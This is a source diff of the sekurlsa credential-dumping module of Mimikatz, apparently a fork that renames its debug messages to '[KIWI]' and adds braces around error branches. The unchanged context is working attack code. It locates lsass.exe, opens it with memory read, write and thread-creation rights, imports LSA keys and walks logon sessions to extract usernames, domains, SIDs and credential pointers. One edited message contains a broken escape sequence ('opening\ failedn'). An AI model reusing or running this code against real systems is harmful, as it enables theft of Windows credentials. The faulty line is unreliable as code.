@@ -93,8 +93,10 @@ NTSTATUS kuhl_m_sekurlsa_process(int argc, wchar_t * argv[])
 NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
 {
 	kprintf(L"Switch to MINIDUMP\n");
-	if(argc != 1)
-		dprintf(L"[MIMIKATZ] <minidumpfile.dmp> argument is missing\n");
+	if (argc != 1)
+	{
+		dprintf(L"[KIWI] <minidumpfile.dmp> argument is missing\n");
+	}
 	else
 	{
 		kuhl_m_sekurlsa_reset();
@@ -144,7 +146,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_range(PMEMORY_BASIC_INFORMATION pMemoryBasicI
 
 NTSTATUS kuhl_m_sekurlsa_all(int argc, wchar_t * argv[])
 {
-	dprintf(L"[MIMIKATZ] Running kuhl_m_sekurlsa_getLogonData");
+	dprintf(L"[KIWI] Running kuhl_m_sekurlsa_getLogonData");
 	return kuhl_m_sekurlsa_getLogonData(lsassPackages, sizeof(lsassPackages) / sizeof(PKUHL_M_SEKURLSA_PACKAGE), NULL, NULL);
 }
 
@@ -169,7 +171,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 	PMINIDUMP_SYSTEM_INFO pInfos;
 	DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
 
-	dprintf(L"[MIMIKATZ] Attempting to acquire LSA");
+	dprintf(L"[KIWI] Attempting to acquire LSA");
 
 	if(!cLsass.hLsassMem)
 	{
@@ -186,7 +188,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 				Type = KULL_M_MEMORY_TYPE_PROCESS;
 				if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
 					hData = OpenProcess(processRights, FALSE, pid);
-				else dprintf(L"[MIMIKATZ] LSASS process not found (?)\n");
+				else dprintf(L"[KIWI] LSASS process not found (?)\n");
 			}
 
 			if(hData && hData != INVALID_HANDLE_VALUE)
@@ -202,16 +204,22 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 							cLsass.osContext.BuildNumber  = pInfos->BuildNumber;
 
 							if(cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION)
-								dprintf(L"[MIMIKATZ] Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
+							{
+								dprintf(L"[KIWI] Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
+							}
 						#ifdef _M_X64
-							if(pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64)
-								dprintf(L"[MIMIKATZ] Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
+							if (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64)
+							{
+								dprintf(L"[KIWI] Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
+							}
 						#elif defined _M_IX86
-							if(pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL)
-								dprintf(L"[MIMIKATZ] Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
+							if (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL)
+							{
+								dprintf(L"[KIWI] Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
+							}
 						#endif
 						}
-						else dprintf(L"[MIMIKATZ] Minidump without SystemInfoStream (?)\n");
+						else dprintf(L"[KIWI] Minidump without SystemInfoStream (?)\n");
 					}
 					else
 					{
@@ -229,16 +237,18 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 						{
 							status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);
 
-							if(!NT_SUCCESS(status))
-								dprintf(L"[MIMIKATZ] Key import\n");
+							if (!NT_SUCCESS(status))
+							{
+								dprintf(L"[KIWI] Key import failed\n");
+							}
 						}
-						else dprintf(L"[MIMIKATZ] Logon list\n");
+						else dprintf(L"[KIWI] Logon list failed\n");
 					}
-					else dprintf(L"[MIMIKATZ] Modules informations\n");
+					else dprintf(L"[KIWI] Modules informations failed\n");
 				}
-				else dprintf(L"[MIMIKATZ] Memory opening\n");
+				else dprintf(L"[KIWI] Memory opening\ failedn");
 			}
-			else dprintf(L"[MIMIKATZ] Handle of memory : %08x\n", GetLastError());
+			else dprintf(L"[KIWI] Handle of memory : %08x\n", GetLastError());
 
 			if(!NT_SUCCESS(status))
 			{
@@ -246,7 +256,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 				CloseHandle(hData);
 			}
 		}
-		else dprintf(L"[MIMIKATZ] Local LSA library failed\n");
+		else dprintf(L"[KIWI] Local LSA library failed\n");
 	}
 	return status;
 }
@@ -279,7 +289,7 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 
 	if(NT_SUCCESS(status))
 	{
-		dprintf(L"[MIMIKATZ] Acquired LSA");
+		dprintf(L"[KIWI] Acquired LSA");
 		sessionData.cLsass = &cLsass;
 		sessionData.lsassLocalHelper = lsassLocalHelper;
 
@@ -299,7 +309,7 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 			kull_m_memory_copy(&data, &securityStruct, sizeof(ULONG));
 		else *(PULONG) data.address = 1;
 
-		dprintf(L"[MIMIKATZ] iterating %d lists", nbListes);
+		dprintf(L"[KIWI] iterating %d lists", nbListes);
 		for(i = 0; i < nbListes; i++)
 		{
 			securityStruct.address = &LogonSessionList[i];
@@ -307,10 +317,10 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 			data.hMemory = &hLocalMemory;
 			if(aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))
 			{
-				dprintf(L"[MIMIKATZ] List %d allocated", i);
+				dprintf(L"[KIWI] List %d allocated", i);
 				if(kull_m_memory_copy(&data, &securityStruct, sizeof(PVOID)))
 				{
-					dprintf(L"[MIMIKATZ] List %d memory copied", i);
+					dprintf(L"[KIWI] List %d memory copied", i);
 					data.address = pStruct;
 					data.hMemory = securityStruct.hMemory;
 
@@ -326,7 +336,7 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 							sessionData.pCredentials= *(PVOID *)		((PBYTE) aBuffer.address + helper->offsetToCredentials);
 							sessionData.pSid		= *(PSID *)			((PBYTE) aBuffer.address + helper->offsetToPSid);
 
-							dprintf(L"[MIMIKATZ] List %d getting strings", i);
+							dprintf(L"[KIWI] List %d getting strings", i);
 							kull_m_string_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
 							kull_m_string_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
 							kuhl_m_sekurlsa_utils_getSid(&sessionData.pSid, cLsass.hLsassMem);
@@ -348,7 +358,7 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 	}
 	else
 	{
-		dprintf(L"[MIMIKATZ] Failed to acquire LSA: %u %x", status, status);
+		dprintf(L"[KIWI] Failed to acquire LSA: %u %x", status, status);
 	}
 	return status;
 }
@@ -357,7 +367,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LO
 {
 	PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA pLsassData = (PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA) pOptionalData;
 	ULONG i;
-	dprintf(L"[MIMIKATZ] callback invoked with %p", pData);
+	dprintf(L"[KIWI] callback invoked with %p", pData);
 	if((pData->LogonType != Network)/* && pData->LogonType != UndefinedLogonType*/)
 	{
 		kuhl_m_sekurlsa_printinfos_logonData(pData);
